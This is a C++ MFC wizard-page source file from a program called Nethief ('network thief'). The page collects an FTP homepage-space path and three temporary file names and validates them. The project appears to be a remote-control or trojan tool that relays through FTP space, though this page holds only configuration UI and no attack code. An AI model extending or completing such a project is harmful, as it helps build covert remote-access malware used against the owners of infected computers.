// WizardPage3.cpp : implementation file
// Download by http://www.NewXing.com

#include "stdafx.h"
#include "Nethief.h"
#include "WizardPage3.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizardPage3 property page

IMPLEMENT_DYNCREATE(CWizardPage3, CPropertyPage)

CWizardPage3::CWizardPage3() : CPropertyPage(CWizardPage3::IDD)
{
	//{{AFX_DATA_INIT(CWizardPage3)
	m_strPath = _T("./photo");
	m_strFilename1 = _T("pic1.bmp");
	m_strFilename2 = _T("pic2.bmp");
	m_strFilename3 = _T("pic3.bmp");
	//}}AFX_DATA_INIT
}

CWizardPage3::~CWizardPage3()
{
}

void CWizardPage3::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizardPage3)
	DDX_Text(pDX, IDC_EDIT_PATH, m_strPath);
	DDX_Text(pDX, IDC_EDIT_FILENAME1, m_strFilename1);
	DDX_Text(pDX, IDC_EDIT_FILENAME2, m_strFilename2);
	DDX_Text(pDX, IDC_EDIT_FILENAME3, m_strFilename3);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizardPage3, CPropertyPage)
	//{{AFX_MSG_MAP(CWizardPage3)
		// NOTE: the ClassWizard will add message map macros here
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizardPage3 message handlers

BOOL CWizardPage3::OnQueryCancel() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(MessageBox("网络神偷设置向导未完成设置过程。\r\n\r\n是否想退出本向导？",
		"网络神偷 设置向导",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return FALSE;
	
	return CPropertyPage::OnQueryCancel();
}

LRESULT CWizardPage3::OnWizardNext() 
{
	// TODO: Add your specialized code here and/or call the base class
	UpdateData(TRUE);

	CString strText="";
	if(m_strPath=="")
		strText="请填写“主页空间临时文件的保存路径”。";
	if(m_strFilename1=="")
		strText="请填写“主页空间 临时文件1 的文件名”。";
	if(m_strFilename2=="")
		strText="请填写“主页空间 临时文件2 的文件名”。";
	if(m_strFilename3=="")
		strText="请填写“主页空间 临时文件3 的文件名”。";
	if(strText!="")
	{
		MessageBox(strText,"网络神偷 设置向导",MB_ICONWARNING|MB_OK);
		return -1;
	}
	m_strPath.TrimLeft();
	m_strPath.TrimRight();
	m_strFilename1.TrimLeft();
	m_strFilename1.TrimRight();
	m_strFilename2.TrimLeft();
	m_strFilename2.TrimRight();
	m_strFilename3.TrimLeft();
	m_strFilename3.TrimRight();

	CCommunity* pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pCommunity->SetFtpServerInfo(1,
		"","","","",
		m_strPath,m_strFilename1,m_strFilename2,m_strFilename3,
		"",
		"");
	
	return CPropertyPage::OnWizardNext();
}
